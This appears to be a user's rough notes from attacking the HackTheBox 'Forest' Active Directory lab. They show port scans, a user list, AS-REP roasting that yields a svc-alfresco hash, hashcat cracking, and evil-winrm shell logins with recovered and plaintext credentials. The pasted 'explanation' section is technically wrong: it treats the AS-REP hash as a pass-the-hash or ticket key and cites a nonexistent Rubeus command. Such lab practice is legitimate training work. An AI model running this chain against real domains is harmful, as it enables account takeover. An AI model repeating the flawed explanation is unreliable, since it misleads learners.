evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987

## enumeration

```
Running all scans on 10.10.10.161

Host is likely running Windows


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman



---------------------Starting Script Scan-----------------------
                                                                                                               


PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-20 06:18:54Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-19T22:19:17-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-01-20T06:19:19
|_  start_date: 2025-01-20T06:14:40
|_clock-skew: mean: 2h47m23s, deviation: 4h37m09s, median: 7m22s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required




---------------------Starting Full Scan------------------------
                                                                                                               


PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown



Making a script scan on extra ports: 9389, 47001, 49664, 49665, 49666, 49668, 49670, 49676, 49677, 49684, 49706
                                                                                                               


PORT      STATE SERVICE    VERSION
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

## enumerating smb

https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference

smbmap -H $IP 

no result

cme smb -

## ldapsearch

ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161

## enum4linux serch

enum4linux -U -o 10.10.10.161

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]


python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile user.txt -format hashcat -outputfile hashes.txt

```
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:551fefcdbe6bd38fa9495e57995ed2d6$92acd15a0f8d04783d3959a2409dc2e2bab01f687457eb9a823c3560f0eb981a769bd80ee546c2f5f5e9b06bfbebf877e43394fae2c98a4e4babc88a95444be2e1d5ba7d600833f72edb31ac5edce8eb4c2d9e241c207abe938e316e57b2c312fc5cbd6a40e69c88fe7a27e12d4456f28bee9ab15970e9c546ecba002efa2813958522a8cd0e3f7be06469b590d272c232c284ffebe9941d7b30e788a3238815ee6b451171aa783ba5523592fabeff4febd19bbda4af12f5f88ed74359d35bb2f04c6cc5eddecca686f606c3e19e0cd0132064be49561dd9e46ec808949cd64804580ef6a2e5
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                  
```

### crackmapexec

 crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -d htb.local -H $krb5asrep$23$svc-alfresco@HTB.LOCAL:551fefcdbe6bd38fa9495e57995ed2d6$92acd15a0f8d04783d3959a2409dc2e2bab01f687457eb9a823c3560f0eb981a769bd80ee546c2f5f5e9b06bfbebf877e43394fae2c98a4e4babc88a95444be2e1d5ba7d600833f72edb31ac5edce8eb4c2d9e241c207abe938e316e57b2c312fc5cbd6a40e69c88fe7a27e12d4456f28bee9ab15970e9c546ecba002efa2813958522a8cd0e3f7be06469b590d272c232c284ffebe9941d7b30e788a3238815ee6b451171aa783ba5523592fabeff4febd19bbda4af12f5f88ed74359d35bb2f04c6cc5eddecca686f606c3e19e0cd0132064be49561dd9e46ec808949cd64804580ef6a2e5


 psexec.py “svc-alfresco”:@10.10.10.161 -hashes $krb5asrep$23$svc-alfresco@HTB.LOCAL:551fefcdbe6bd38fa9495e57995ed2d6$92acd15a0f8d04783d3959a2409dc2e2bab01f687457eb9a823c3560f0eb981a769bd80ee546c2f5f5e9b06bfbebf877e43394fae2c98a4e4babc88a95444be2e1d5ba7d600833f72edb31ac5edce8eb4c2d9e241c207abe938e316e57b2c312fc5cbd6a40e69c88fe7a27e12d4456f28bee9ab15970e9c546ecba002efa2813958522a8cd0e3f7be06469b590d272c232c284ffebe9941d7b30e788a3238815ee6b451171aa783ba5523592fabeff4febd19bbda4af12f5f88ed74359d35bb2f04c6cc5eddecca686f606c3e19e0cd0132064be49561dd9e46ec808949cd64804580ef6a2e5


### explanation

```md
1. Impacket's psexec with Kerberos Authentication

You can use Impacket, which supports passing Kerberos tickets or hashes directly. First, ensure that you have a valid Kerberos ticket or configuration.

Here’s how you can pass the AS-REP hash using impacket-psexec or similar tools:

export KRB5CCNAME=/path/to/your/ccache
impacket-psexec -k -no-pass -dc-ip <DC_IP> <domain>/<user>@<target>

Steps to generate a valid ccache:

    Use the AS-REP hash to authenticate and generate a Kerberos ticket. A tool like impacket-getTGT can help:

impacket-getTGT -hashes :$krb5asrep$23$svc-alfresco@HTB.LOCAL:551fefcd... htb.local/svc-alfresco

This will save the Kerberos ticket in the default ccache location (e.g., /tmp/krb5cc_<uid>).

Export the generated ccache and use it for further authentication:

    export KRB5CCNAME=/path/to/ccache

Now, use Impacket tools like wmiexec.py, smbexec.py, or psexec.py for remote execution.
2. Kerbrute or Rubeus for Kerberos Authentication

If you want to leverage the hash directly for Kerberos-based authentication, tools like Rubeus (for Windows) or Kerbrute (for Linux) can help.
Using Rubeus:

    Use Rubeus to request a TGT using the AS-REP hash:

Rubeus.exe asktgt /user:svc-alfresco /rc4:551fefcdbe6bd38fa9495e57995ed2d6 /domain:htb.local /outfile:tgt.kirbi

Inject the TGT into the current session:

    Rubeus.exe tgt::import /ticket:tgt.kirbi

    Then, use tools like PsExec or WinRM clients that support Kerberos authentication.

3. CrackMapExec with Kerberos Tickets

CrackMapExec has a --kerberos flag to use pre-generated Kerberos tickets. Combine this with Impacket or other tools to generate the tickets.

    Generate a TGT using impacket-getTGT or Rubeus (as shown above).
    Use CrackMapExec to pass the ticket:

    export KRB5CCNAME=/path/to/ccache
    crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -d htb.local --kerberos

4. Evil-WinRM with Kerberos

Evil-WinRM can authenticate using Kerberos tickets. If the AS-REP hash is used to generate a valid ticket, you can pass it to Evil-WinRM:

    Generate a TGT (via Impacket or Rubeus).
    Run Evil-WinRM with Kerberos support:

evil-winrm -i 10.10.10.161 -u svc-alfresco -r htb.local -k
````

### cracking with hashcat

hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -d htb.local -p 's3r3ndipit'

evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3r3ndipit'